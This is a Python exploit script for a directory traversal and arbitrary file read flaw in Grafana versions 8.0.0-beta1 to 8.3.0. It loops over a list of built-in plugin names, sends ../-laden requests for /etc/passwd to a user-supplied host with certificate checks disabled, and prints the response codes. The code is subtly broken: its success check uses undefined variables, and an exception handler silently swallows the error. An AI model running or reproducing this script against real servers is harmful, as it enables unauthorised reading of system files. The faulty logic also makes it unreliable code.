#!/usr/bin/python3
import requests
import argparse
import sys
plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }
    for plugin in plugin_list:
        file_to_read = '/etc/passwd'
        try:
            
            if "443" in args.port:
                url1 = "https://" + args.host + ":" + args.port + '/public/plugins/' + plugin + '/../../../../../../../..' + file_to_read
                url2 = "https://" + args.host + ":" + args.port + '/public/plugins/' + plugin + '/../../../../../../../../../../../../..' + file_to_read
            else:
                url1 = "http://" + args.host + ":" + args.port + '/public/plugins/' + plugin + '/../../../../../../../..' + file_to_read
                url2 = "http://" + args.host + ":" + args.port + '/public/plugins/' + plugin + '/../../../../../../../../../../../../..' + file_to_read
            
            req1 = requests.Request(method='GET', url=url1, headers=headers)
            prep1 = req1.prepare()
            prep1.url = url1
            r1 = s.send(prep1, verify=False, timeout=3)
            

            req2 = requests.Request(method='GET', url=url2, headers=headers)
            prep2 = req2.prepare()
            prep2.url = url2
            r2 = s.send(prep2, verify=False, timeout=3)

            print(f'{url1 } >> {r1.status_code}')
            print(f'{url2 } >>> {r2.status_code}')
            print ("\n")
            if 'root ' in r.text:
                print(f'[-] VULNERABLE {url}\n')
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass
def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    parser.add_argument('-p',dest='port',required=True, help="port host")
    args = parser.parse_args()
    try:
        exploit(args)
    except KeyboardInterrupt:
        return
if __name__ == '__main__':
    main()
    sys.exit(0)
